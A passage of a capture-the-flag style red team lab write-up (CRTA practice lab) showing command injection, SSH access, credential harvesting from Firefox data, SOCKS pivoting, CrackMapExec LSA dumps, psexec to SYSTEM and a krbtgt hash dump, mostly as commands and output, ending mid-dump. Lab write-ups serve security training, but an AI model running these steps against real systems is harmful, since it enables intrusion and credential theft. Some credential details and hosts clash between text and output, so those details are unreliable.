<p class="indent-paragraph">
The primary objective of this Red Team Operation is to assess the security posture of the enterprise environment. The engagement aims to identify vulnerabilities, and misconfigurations in the AD environment and provide actionable recommendations for enhancing the security of the infrastructure.
</p>

<p class="indent-paragraph">
Below is the achievement badge earned upon completing this machine, validating the successful exploitation of all required objectives.
</p><br>

<div style="text-align: center; margin-top: 1em;">
  <a href="https://labs.cyberwarfare.live/badge/image/681fb675696368ff56f09813" target="_blank" style="text-decoration: none; font-family: monospace; background: #0f0f0f; color: #00bfff; padding: 6px 12px; border: 1px solid #00bfff; border-radius: 6px; display: inline-block;">CRTA Practise Lab Badge</a>
</div><br>

---

<p class="indent-paragraph">
The scope for this assessment includes remote access via VPN and the following IP ranges within the lab environment:
</p>

<div style="display: flex; justify-content: center; margin: 2em 0;">
  <table style="border-collapse: collapse; border: 1px solid #444; min-width: 420px;">
    <thead>
      <tr>
        <th style="border: 1px solid #555; padding: 8px 16px; text-align: center;">FIELD</th>
        <th style="border: 1px solid #555; padding: 8px 16px; text-align: center;">VALUE</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td style="border: 1px solid #555; padding: 8px 16px;">VPN IP Range</td>
        <td style="border: 1px solid #555; padding: 8px 16px;">10.10.200.0/24</td>
      </tr>
      <tr>
        <td style="border: 1px solid #555; padding: 8px 16px;">External IP Range</td>
        <td style="border: 1px solid #555; padding: 8px 16px;">192.168.80.0/24</td>
      </tr>
      <tr>
        <td style="border: 1px solid #555; padding: 8px 16px;">Internal IP Range</td>
        <td style="border: 1px solid #555; padding: 8px 16px;">192.168.98.0/24</td>
      </tr>
    </tbody>
  </table>
</div>

### 🧩 Enumeration and Initial Access

<p class="indent-paragraph">
The reconnaissance phase commenced with identification of the external and internal IP ranges defined in the lab scope: <code>192.168.80.0/24</code> and <code>192.168.98.0/24</code><span class="codefix">.</span> These subnets typically host infrastructure components such as perimeter services, internal servers, and domain resources. The addresses <code>192.168.80.1</code> and <code>192.168.98.1</code> were explicitly excluded from testing, as they fall outside the authorized engagement scope. With these constraints enforced, enumeration focused solely on the approved ranges to discover active hosts and map the initial attack surface.
</p>

```
~$ nmap -sn 192.168.80.2-254

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 14:14 MDT
Nmap scan report for 192.168.80.10
Host is up (0.17s latency).
Nmap done: 253 IP addresses (1 host up) scanned in 12.42 seconds
```

<p class="indent-paragraph">
Once the only live host in the external network (<code>192.168.80.10</code>) was identified, a service enumeration scan was performed to discover running applications and collect version information. The scan employed the <code>-sC</code> flag for default NSE scripts, <code>-sV</code> for service/version detection, <code>-p-</code> to probe all 65 535 TCP ports, and <code>-T4</code> to optimize speed without excessive aggression.
</p>
<p class="indent-paragraph">
This enumeration phase established the foundation for deeper analysis. Subsequent steps will involve interacting with the HTTP service to examine its structure, uncover hidden paths, and identify potential input vectors for exploitation.
</p>

```
~$ nmap -sC -sV -p- -T4 192.168.80.10 2>/dev/null

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 14:33 MDT
Warning: 192.168.80.10 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.80.10
Host is up (0.22s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 8d:c3:a7:a5:bf:16:51:f2:03:85:a7:37:ee:ae:8d:81 (RSA)
|   256  9a:b2:73:5a:e5:36:b4:91:8d:8c:f7:4a:d0:15:65:28 (ECDSA)
|_  256  3c:16:a7:6a:b6:33:c5:83:ab:7f:99:60:6a:4c:09:11 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Cyber WareFare Labs
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 754.45 seconds
```

<p class="indent-paragraph">
To streamline operations and eliminate the need to repeatedly type the raw IP address, the target <code>192.168.80.10</code> was mapped to a custom hostname via the local resolver configuration.
</p>

```
~$ sudo nano /etc/hosts

192.168.80.10 ecommerce.lab
```

<p class="indent-paragraph">
Navigation to <code>ecommerce.lab</code> revealed a login portal for a platform identified as <code>Cyberwarops E-commerce</code><span class="codefix">.</span> This page corresponded to the HTTP title observed during the Nmap scan. A “Sign Up” link was located beneath the login form, directing to the user registration endpoint at <code>http://ecommerce.lab/registration.php</code><span class="codefix">.</span>
</p>
<p class="indent-paragraph">
  <img src="/img/redteam/cwl/crta-http-login.png" alt="login page cyberwarcops" style="width:100%; border-radius:6px; margin-top: 1em;" />
</p>

<p class="indent-paragraph">
During exploration of the authenticated area at <code>http://ecommerce.lab/dashboard1.php</code><span class="codefix">,</span> a newsletter subscription field was identified that accepts an email address as input. Submitting this form produced a JavaScript alert with the message <code>alert("Thanks for subcribing ..!")</code><span class="codefix">.</span>
</p>
<p class="indent-paragraph">
  <img src="/img/redteam/cwl/crta-newsletter-email.png" alt="Thanks for subcribing" style="width:100%; border-radius:6px; margin-top: 1em;" />
</p>

### 🧨 Command Injection via Email Parameter

<p class="indent-paragraph">
The output of raw <code>&lt;script&gt;</code> tags demonstrates that the server dynamically generates JavaScript based on user input. This strongly suggests that the `EMAIL` parameter is executed by the underlying system shell without proper validation or sanitization. A POST request with <code>EMAIL=cat /etc/passwd</code> was crafted to confirm the injection point, resulting in disclosure of the <code>/etc/passwd</code> file. This confirms the presence of an unauthenticated command injection vulnerability.
</p>
<p class="indent-paragraph">
  <img src="/img/redteam/cwl/crta-command-injection-email.png" alt="Command Injection via Email Parameter" style="width:100%; border-radius:6px; margin-top: 1em;" />
</p>

### 🔐 Remote Shell Access via SSH

<p class="indent-paragraph">
After confirming command injection and file enumeration, a local user account named <code>privilege</code> with a valid login shell <code>(/bin/bash)</code> was identified. Common credentials were tested, ultimately allowing successful SSH authentication using the discovered password. This connection verified that the <code>privilege</code> account has remote shell access to the server, presenting a standard bash shell with no additional restrictions.
</p>

```
~$ sshpass -p Admin@962 ssh privilege@192.168.80.10
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-67-generic x86_64)

Last login: Sat Apr 19 22:44:58 2025 from <IP>
```

<p class="indent-paragraph">
After obtaining a stable shell as the <code>privilege</code> user, basic system enumeration was conducted to identify potential privilege escalation vectors, running services, misconfigurations, and sensitive files. LinPEAS, a widely used Linux post-exploitation enumeration tool, was chosen for its comprehensive checks. The tool was transferred to the target via a silent HTTP download to avoid generating on-screen output or error messages, with the <code>-s</code> option enabling silent mode and <code>2&gt;/dev/null</code> suppressing any error messages to ensure the download remained discreet.
</p>

```
~$ privilege@ubuntu-virtual-machine:/tmp$ curl -s -o linpeas.sh http://<IP>:8000/linpeas.sh 2>/dev/null

~$ privilege@ubuntu-virtual-machine:/tmp$ ll
total 932

drwxrwxrwt 22 root root    4096 Apr 26 22:48 .
drwxr-xr-x 20 root root    4096 Dec 20 08:10 ..
-rw-r--r--  1 privilege privilege       0 Jan 21 17:19 config-err-Rt6GJK
drwxr-xr-x  2 root      root    4096 Jan 21 17:06 .font-unix
drwxrwxrwt  2 privilege privilege       4096 Jan 21 17:19 .ICE-unix
-rw-r--r--  1 privilege privilege 853290 Apr 26 22:48 linpeas.sh
drwx------  2 root      root    4096 Jan 21 17:06 snap-private-tmp/
drwx------  2 privilege privilege    4096 Jan 21 17:19 ssh-lZdebRLpSqW2/
drwx------  2 root      root    4096 Jan 21 17:06 systemd-private-dafd168f87334d24b5df59ebe8bae57a7-apache2.service-3WBmph/
drwx------  2 root      root    4096 Jan 21 17:06 systemd-private-dafd168f87334d24b5df59ebe8bae57a7-colord.service-jrbf2e/
drwx------  2 root      root    4096 Jan 21 17:06 systemd-private-dafd168f87334d24b5df59ebe8bae57a7-fwpumd.service-M4u89g/
drwx------  2 root      root    4096 Jan 21 17:06 systemd-private-dafd168f87334d24b5df59ebe8bae57a7-ModemManager.service-ryXuJj/
drwx------  2 root      root    4096 Jan 21 17:06 systemd-private-dafd168f87334d24b5df59ebe8bae57a7-switcheroo-control.service-DNaKQh/
drwx------  2 root      root    4096 Jan 21 17:06 systemd-private-dafd168f87334d24b5df59ebe8bae57a7-systemd-logind.service-cZHPcj/
drwx------  2 root      root    4096 Jan 21 17:06 systemd-private-dafd168f87334d24b5df59ebe8bae57a7-systemd-resolved.service-Q8h7vg/
drwx------  2 root      root    4096 Jan 21 17:06 systemd-private-dafd168f87334d24b5df59ebe8bae57a7-systemd-timesyncd.service-cmxtvf/
drwx------  2 root      root    4096 Jan 21 17:06 systemd-private-dafd168f87334d24b5df59ebe8bae57a7-upower.service-bejEXh/
drwxrwxrwt  2 privilege privilege    4096 Apr 26 22:26 .Test-unix/
drwxr-xr-x  2 gdm       gdm     4096 Jan 21 17:06 tracker-extract-files.1001/
drwxrwxrwt  2 root      root    4096 Jan 21 17:06 vmwareDnD/
drwxr-xr-x  2 root      root    4096 Jan 21 17:06 vmware-root_669-3980232826/
-rw-r--r--  1 gdm       gdm       11 Jan 21 17:06 .X1024-lock
-rw-r--r--  1 gdm       gdm       11 Jan 21 17:06 .X1025-lock
drwxr-xr-x  2 root      root    4096 Jan 21 17:19 .X11-unix
drwxr-xr-x  2 root      root    4096 Jan 21 17:19 .XIM-unix
```

<p class="indent-paragraph">
After confirming the successful download to <code>/tmp</code><span class="codefix">,</span> the <code>linpeas.sh</code> script was executed to perform a deeper enumeration of the environment. During its run, LinPEAS revealed multiple Firefox-related artifacts within the user’s home directory at <code>/home/privilege/.mozilla/firefox/</code><span class="codefix">,</span> suggesting prior browser activity and potential credential storage.
</p>

```
~$ ./linpeas.sh > linpeas-output.txt

➜ Found interesting column names in nmo:Email_nmo:contentMimeType (output limit 10)
CREATE TABLE IF NOT EXISTS "nmo:Email_nmo:contentMimeType" (
  ID INTEGER NOT NULL,
  "nmo:contentMimeType" TEXT NOT NULL,
  "nmo:contentMimeType:graph" INTEGER
);

➜ Extracting tables from /home/privilege/.local/share/evolution/addressbook/system/contacts.db (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/cert9.db (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/content-prefs.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/cookies.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/credentialstate.sqlite (limit 20)
➜ Found interesting column names in identity (output limit 10)
CREATE TABLE identity (
  rpOrigin TEXT NOT NULL,
  idpOrigin TEXT NOT NULL,
  credentialId TEXT NOT NULL,
  registered INTEGER,
  allowLogout INTEGER,
  modificationTime INTEGER,
  rpBaseDomain TEXT,
  PRIMARY KEY (rpOrigin, idpOrigin, credentialId)
);

➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/favicons.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/formhistory.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/key4.db (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/permissions.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/places.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/protections.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/storage/default/https+++gofile.io/ls/data.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/storage/ls-archive.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/storage/permanent/chrome/idb/1451318868ntourmalonadry-eprc.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/storage/permanent/chrome/idb/1657114595AmcateirqvistStiy.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/storage/permanent/chrome/idb/2823318777ntourmalonadry-naod.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/storage/permanent/chrome/idb/2918063365piupsah.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/storage/permanent/chrome/idb/3561288849sdihlre.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/storage/permanent/chrome/idb/3870112724resgnmoitte-s.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/storage.sqlite (limit 20)
➜ Extracting tables from /home/privilege/.mozilla/firefox/b2rri1qd.default-release/webappsstore.sqlite (limit 20)
➜ Extracting tables from /home/ubuntu/.cache/tracker/meta.db (limit 20)
➜ Found interesting column names in ncal:UnionParentClass (output limit 10)
```

### 🔎 Extracting Recent Firefox Browser History

<p class="indent-paragraph">
  With access to the Firefox profile at <code>~/.mozilla/firefox/b2rri1qd.default-release/</code><span class="codefix">,</span> the investigator located the <code>places.sqlite</code> database, which houses browsing history and bookmark data. The SQLite query retrieved the ten most recently accessed URLs from the Firefox profile. The results reveal repeated visits to local endpoints (for example, <code>http://127.0.0.1/registration.php</code> and <code>http://127.0.0.1/dashboard1.php</code>) alongside accesses to external file-sharing services on <code>gofile.io</code><span class="codefix">,</span> including a direct download link to <code>Web.zip</code><span class="codefix">.</span> These patterns indicate that the system was being used for local web-application testing and distribution, consistent with a development or deployment workflow.
</p>

```
~$ privilege@ubuntu-virtual-machine:~$ sqlite3 ~/.mozilla/firefox/b2rri1qd.default-release/places.sqlite "SELECT url FROM moz_places ORDER BY last_visit_date DESC LIMIT 10;"

http://127.0.0.1/registration.php
http://127.0.0.1/
http://127.0.0.1/index.php
http://127.0.0.1/logout.php?logout
http://127.0.0.1/Template%20Main/Template%20Main/images/9.jpg
http://127.0.0.1/dashboard1.php
https://store4.gofile.io/download/web/fe8132dc-dc74-4fd4-8e3a-bef8aee41a8e/Web.zip
https://gofile.io/d/LK6s4P
https://gofile.io/d/LK6s4P
https://gofile.io/d/LK6s4P
```

<p class="indent-paragraph">
   To extract the stored bookmarks, the <code>sqlite3</code> utility was used to query the <code>moz_bookmarks</code> table. Among the default entries, one custom bookmark stood out: <code>http://192.168.98.30/admin/index.php?user=john@child.warfare.corp&amp;pass=User10#%$!</code><span class="codefix">.</span> This entry suggests the existence of an administrative panel hosted at <code>192.168.98.30</code><span class="codefix">,</span> which is part of the internal subnet previously discovered (<code>192.168.98.0/24</code>). More importantly, the bookmark includes embedded credentials in the URL query string.
</p>

```
~$ privilege@ubuntu-virtual-machine:~$ sqlite3 ~/.mozilla/firefox/b2rri1qd.default-release/places.sqlite "SELECT * FROM moz_bookmarks;"

1|2|1|0|menu|1737028376389000|1737028407427000|root_______|1|1
2|2|1|0|menu|1737028376389000|1737028376683000|menu_______|1|3
3|2|1|1|toolbar|1737028376389000|1737028376773000|toolbar____|1|3
4|2|1|2|tags|1737028376389000|1737028376389000|tags________|1|1
5|2|1|3|unfiled|1737028376389000|1737028407427000|unfiled____|1|2
6|2|1|4|mobile|1737028376397000|1737028376662000|mobile______|1|2
7|2|2|0|Mozilla Firefox|1737028376683000|1737028376683000|2hcCSTYguEk2|0|1
8|1|3|7|0|Get Help|1737028376683000|1737028376683000|w8hhWMYvmHY6|0|1
9|1|4|7|1|Customize Firefox|1737028376683000|1737028376683000|uctFzas86dQw|0|1
10|1|5|7|2|Get Involved|1737028376683000|1737028376683000|2-X79YDQmgEh|0|1
11|1|6|7|3|About Us|1737028376683000|1737028376683000|GewYCw2g0FLJ|0|1
12|1|2|1|Ubuntu and Free Software links|1737028376683000|1737028376683000|MxAMPgqX16gZ|0|1
13|1|7|2|Ubuntu|||Qt4eHCSUhI0L|0|1
14|1|8|1|Ubuntu Wiki (community-edited website)|1737028376683000|1737028376683000|nbf_eTkjwhpvl|0|1
15|1|9|12|Make a Support Request to the Ubuntu Community|||ukdJ8dcfVTPm|0|1
16|1|10|13|Debian (Ubuntu is based on Debian)|||xg0MK5g3l2Zp|0|1
17|1|11|3|Getting Started|||Kt61Q_eV70GT|0|1
18|1|16|5|0|http://192.168.98.30/admin/index.php?user=john@child.warfare.corp&pass=User1a#$%6|||1737028407427000|173702966639000|1|7
```
### 🌐 Identifying Network Interfaces 

<p class="indent-paragraph">
The network interfaces were enumerated to determine which IPv4 subnets were reachable from the compromised host. By running <code>ip -4 a | grep inet</code><span class="codefix">,</span> the following addresses were identified, confirming the host bridges two distinct network segments:
</p>

```
~$ privilege@ubuntu-virtual-machine:~$ ip -4 a | grep inet

inet 127.0.0.1/8 scope host lo
inet 192.168.98.15/24 brd 192.168.98.255 scope global noprefixroute ens34
inet 192.168.80.10/24 brd 192.168.80.255 scope global noprefixroute ens32
```

<p class="indent-paragraph">
To quickly identify live hosts on the internal subnet <code>(192.168.98.0/24)</code><span class="codefix">,</span> a concise Python one-liner performed an ICMP sweep. The output revealed which systems were reachable and prioritized them for further exploration.
</p>

```
~$ privilege@ubuntu-virtual-machine:~$ python3 -c "import os; [os.system('ping -c 1 -W 1 192.168.98.%d >/dev/null 2>&1 && echo Host 192.168.98.%d is up' % (i, i)) for i in range(1, 255)]"

Host 192.168.98.2 is Up
Host 192.168.98.15 is Up
Host 192.168.98.30 is Up
Host 192.168.98.120 is Up
```

### 🔗 Proxychains Service Tunneling

<p class="indent-paragraph">
Proxychains was installed on the machine attacker host and configured to route traffic through the SSH SOCKS4 proxy. The package was installed via:
</p>

```
~$ sudo apt install proxychains
```

<p class="indent-paragraph">
Next, the Proxychains configuration file was updated to include the SOCKS4 proxy directive at the end of <code>/etc/proxychains.conf</code><span class="codefix">.</span> This change ensures that all supported connections launched through Proxychains will be forwarded over the local SOCKS4 proxy provided by the SSH tunnel.
</p>

```
~$ nano /etc/proxychains.conf

socks4 127.0.0.1 9050
```

<p class="indent-paragraph">
To enable enumeration of the internal network <code>(192.168.98.0/24)</code> from the attacker’s host, a dynamic SSH tunnel was created using the compromised privilege user. This tunnel exposes a local SOCKS proxy on port <code>9050</code><span class="codefix">,</span> allowing proxy-aware tools to route traffic through the target environment as if they were directly connected to it.
</p>

```
~$ sshpass -p 'Admin@962' ssh -D 9050 privilege@192.168.80.10
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-67-generic x86_64)

Last login: Tue Apr 29 20:05:51 2025 from <IP>
```

### 🧠 Enumerating SMB with CrackMapExec

<p class="indent-paragraph">
With the targets in place and the SSH tunnel active, SMB enumeration was conducted using CrackMapExec to verify operating system fingerprints, domain membership and credential validity. The command authenticated as <code>john:User1@#$%6</code> against each host, resulting in one account lockout and two successful logons, confirming that these credentials permit lateral movement within the <code>child.warfare.corp</code> domain, a pivotal access point for deeper engagement.
</p>

```
~$ cat targets.txt

192.168.98.2
192.168.98.15
192.168.98.30
192.168.98.120

~$ proxychains -q crackmapexec smb targets.txt -u john -p 'User1@#$%6'

SMB         192.168.98.2    445 DC01      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:warfare.corp) (signing:True) (SMBv1:False)
SMB         192.168.98.120  445 CDC      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:True) (SMBv1:False)
SMB         192.168.98.30   445 MGMT     [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:True)
SMB         192.168.98.2    445 DC01     [-] warfare.corp\john:User1@#$%6 STATUS_LOGON_FAILURE
SMB         192.168.98.120  445 CDC      [*] child.warfare.corp\john:User1@#$%6 (Pwn3d!)
```

<p class="indent-paragraph">
After confirming valid domain credentials for user <code>john</code> with the password <code>User1@#$%6</code> and successfully obtaining a <code>Pwn3d!</code> status on host <code>192.168.98.30</code><span class="codefix">,</span> a deeper enumeration was initiated using the --lsa flag via CrackMapExec to extract stored secrets.
</p>

```
~$ proxychains -q crackmapexec smb 192.168.98.30 -u john -p 'User1@#$%6' --lsa

SMB 192.168.98.30 445 MGMT [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp)
(signing:False) (SMBv1:False)
SMB 192.168.98.30 445 MGMT [+] child.warfare.corp\john:User1@#$%6 (Pwn3d!)
SMB 192.168.98.30 445 MGMT [+] Dumping LSA secrets
SMB 192.168.98.30 445 MGMT CHILD.WARFARE.CORP/john:$DCC2$10240#john#9855312d42ee254a7334845613120e61:
(2025-01-17 14:47:56)
SMB 192.168.98.30 445 MGMT
CHILD.WARFARE.CORP/corpmngr:$DCC2$10240#corpmngr#7fd50bbab99e8ea7ae9c1899f6dea7c6: (2025-01-21 11:35:46)
SMB 192.168.98.30 445 MGMT CHILD\MGMT$:aes256-cts-hmac-sha1-
96:344c70047ade222c4ab35694d4e3e36de556692f02ec32fa54d3160f36246eec
SMB 192.168.98.30 445 MGMT CHILD\MGMT$:aes128-cts-hmac-sha1-96:aa5b3d84614911fe611eafbda613baaf
SMB 192.168.98.30 445 MGMT CHILD\MGMT$:des-cbc-md5:6402e0c20b89d386
SMB 192.168.98.30 445 MGMT
CHILD\MGMT$:plain_password_hex:4f005d003b006f0074005d003500760067002f0032007a0046004e0020004d0070002300360057003100500
0770041002600700055003d005a0047006100370033003e003b0032004600410059002a006b0046004400410069003e00530066006a0033006e00
61007a004e0060003300590063005e0048006c005c0053003e003e0033003c007300500043007a002500300031004b00610060002000540033007
a003f004200580048002f0068006d0052006f0027005b00520061003b003a0075002b0050004a005d006b003c006d004c00730045005d005b00740
06c004b00760045005c00280059003a0066002000
SMB 192.168.98.30 445 MGMT
CHILD\MGMT$:aad3b435b51404eeaad3b435b51404ee:0f5fe480dd7eaf1d59a401a4f268b563:::
SMB 192.168.98.30 445 MGMT dpapi_machinekey:0x34e3cc87e11d51028ffb38c60b0afe35d197627d
dpapi_userkey:0xb890e07ba0d31e31c758d305c2a29e1b4ea813a5
SMB 192.168.98.30 445 MGMT
NL$KM:df885acfa168074cc84de093af76093e726cd092e9ef9c72d6fe59c6cbb70382d896c9569b67dcdac871dd77b96916c8c1187d40c118474c48
1ddf62a7c04682
SMB 192.168.98.30 445 MGMT corpmngr@child.warfare.corp:User4&*&*
```

<p class="indent-paragraph">
  These credentials represent high-value access material for further post-exploitation activities such as persistence or lateral movement within the <code>child.warfare.corp</code> domain. Following a successful LSA secrets dump on <code>192.168.98.30</code> (MGMT), a new account credential was recovered from memory—<code>corpmngr@child.warfare.corp:User4&*&*</code><span class="codefix">.</span> The presence of this domain user and its NTLM hashes in memory suggests another account with elevated privileges. To validate this finding, CrackMapExec was re-run against all known targets using the newly discovered credential.
</p>

```
~$ proxychains -q crackmapexec smb targets.txt -u corpmngr -p 'User4&*&*' --lsa 

SMB         192.168.98.2    445 DC01      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:warfare.corp) (signing:True) (SMBv1:False)
SMB         192.168.98.120  445 CDC      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:True) (SMBv1:False)
SMB         192.168.98.30   445 MGMT     [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:True)
SMB         192.168.98.2    445 DC01     [-] warfare.corp\corpmngr:User4&*&* STATUS_LOGON_FAILURE
SMB         192.168.98.120  445 CDC      [*] child.warfare.corp\corpmngr:User4&*&*
SMB         192.168.98.30   445 MGMT     [+] child.warfare.corp\corpmngr:User4&*&* (Pwn3d!)
SMB         192.168.98.30   445 MGMT     [+] Dumping LSA secrets
SMB         192.168.98.30   445 MGMT     CHILD\CDCS:aes256-cts-hmac-sha1-96:b7ac25ac1278b5951f685d8c50bc9ee98338af9ebe7ee3562be8673789c61c
SMB         192.168.98.30   445 MGMT     CHILD\CDCS:aes128-cts-hmac-sha1-96:23ee315ec4d19de69db6e7691d3da9945d19632
SMB         192.168.98.30   445 MGMT     CHILD\CDCS:des-cbc-md5:51a1a83ec41f9267
SMB         192.168.98.30   445 MGMT     CHILD\CDCS:plain_password_hex:ef903d96c92358aeeb906b24de9d4b32e89fae2b35cbb9cfc...
SMB         192.168.98.30   445 MGMT     CHILD\CDCS:aad3b435b51404eeaad3b435b51404ee:6ca9225cb415fec5953900a8513e968::::
SMB         192.168.98.30   445 MGMT     dpapi_machinekey:0x95e0c0452350da239e70d692e67a5cc857a8dfd
SMB         192.168.98.30   445 MGMT     dpapi_userkey:0xb890e07ba0d31e31c758d305c2a29e1b4ea813a5
SMB         192.168.98.30   445 MGMT     NL$KM:df885acfa168074cc84de093af76093e726cd092e9ef9c72d6fe59c6cbb70382d896c9569b67dcdac871dd77b96916c8c1187d40c118474c481ddf62a7c04682
SMB         192.168.98.30   445 MGMT     corpmngr@child.warfare.corp:User4&*&*
```

### 🔑 Internal Access

<p class="indent-paragraph">
After authenticating to the MGMT host <code>192.168.98.30</code> with the <code>child/john:User1@#$%6</code> credentials, the enumeration was escalated by dumping LSA secrets via CrackMapExec, revealing cached domain hashes, DPAPI keys and even a plaintext credential for another account. A subsequent execution of Impacket’s <code>psexec.py</code> achieved code execution as <code>NT AUTHORITY\SYSTEM</code><span class="codefix">,</span> confirming local administrator rights. Standard Windows discovery then verified that the machine was joined to the <code>child.warfare.corp</code> domain and had visibility toward the Child Domain Controller <code>cdc.child.warfare.corp</code><span class="codefix">.</span>
</p>

```
~$ proxychains /root/.local/bin/psexec.py 'child/john:User1@#$%6@192.168.98.30'

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 192.168.98.30.....
[*] Found writable share ADMIN$
[*] Uploading file LOYLoZut.exe
[*] Opening SVCManager on 192.168.98.30.....
[*] Creating service Heno on 192.168.98.30.....
[*] Starting service Heno.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

~$ C:\Windows\system32> whoami
nt authority\system

~$ C:\Windows\system32> net user /dom
The request will be processed at a domain controller for domain child.warfare.corp.

User accounts for \\cdc.child.warfare.corp
Administrator             corpmngr              Guest
john                      krbtgt
The command completed with one or more errors.

~$ C:\Windows\system32> ping cdc.child.warfare.corp
Pinging cdc.child.warfare.corp [192.168.98.120] with 32 bytes of data:
Reply from 192.168.98.120: bytes=32 time<1ms TTL=128
Reply from 192.168.98.120: bytes=32 time<1ms TTL=128
Reply from 192.168.98.120: bytes=32 time<1ms TTL=128
Reply from 192.168.98.120: bytes=32 time<1ms TTL=128

Ping statistics for 192.168.98.120:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms

~$ C:\Windows\system32>
```

<p class="indent-paragraph">
To validate session integrity on the MGMT host, several local enumeration commands were executed. The <code>whoami</code> output confirmed that the shell was running under <code>NT AUTHORITY\SYSTEM</code><span class="codefix">,</span> demonstrating full administrative control. A <code>query session</code> revealed an active console session for the Administrator account, confirming a privileged user was logged in. Finally, a Security log query via <code>wevtutil</code> for Event ID 4624 verified a successful logon event—while the user field in the snippet appeared as “N/A,” the machine name and audit success message confirmed the authentication was processed locally by MGMT, reinforcing the legitimacy of the SYSTEM-level access.
</p>

```
~$ C:\Users> hostname
mgmt

~$ C:\Users> whoami
nt authority\system

~$ C:\Users> query session
 SESSIONNAME       USERNAME       ID  STATE   TYPE        DEVICE
 services          services        0  Disc
 console           Administrator   1  Active

~$ C:\Users> wevtutil qe Security "/q:*[System[(EventID=4624)]]" /f:text /c:5
Event[0]:
  Log Name: Security
  Source: Microsoft-Windows-Security-Auditing
  Date: 2025-01-15T19:33:34.110
  Event ID: 4624
  Task: Logon
  Level: Information
  Opcode: Info
  Keyword: Audit Success
  User: N/A
  User Name: N/A
  Computer: mgmt
  Description:
    indicates which sub-protocol was used among the NTLM protocols.
    - Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
```

<p class="indent-paragraph">
  With a stable foothold and access to internal systems, the next step was to prepare for lateral movement and domain privilege escalation. Hostnames and domain information gathered during earlier enumeration were added to the attacker’s <code>/etc/hosts</code> file to ensure accurate name resolution for SMB and Kerberos operations.
</p>

```
~$ sudo nano /etc/hosts

192.168.98.2 dc01.warfare.corp
192.168.98.120 cdc.child.warfare.corp
```

### 🎫 krbtgt Hash Dump

<p class="indent-paragraph">
  This hosts file update ensured seamless communication and Kerberos authentication with both parent and child domain controllers via fully qualified hostnames. At this point, SYSTEM–level access on the Child Domain Controller <code>192.168.98.120</code> enabled extraction of critical credential material. The first objective was to retrieve the <code>krbtgt</code> NTLM hash, which would later facilitate the creation of a Golden Ticket for unrestricted impersonation within the child—and ultimately the parent—domain.
</p>

```
~$ proxychains /root/.local/bin/secretdump.py -debug child/corpmngr:'User4&*&*'@cdc.child.warfare.corp -just-dc-user 'child\krbtgt'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[+] Impacket Library Installation Path: /root/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[+] Calling DRScrackNames for child\krbtgt
[+] Calling DRSGetNCChanges for {1c0a5a45-4b61-4bdd-adfc-92982f35601d}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=krbtgt,CN=Users,DC=child,DC=warfare,DC=corp
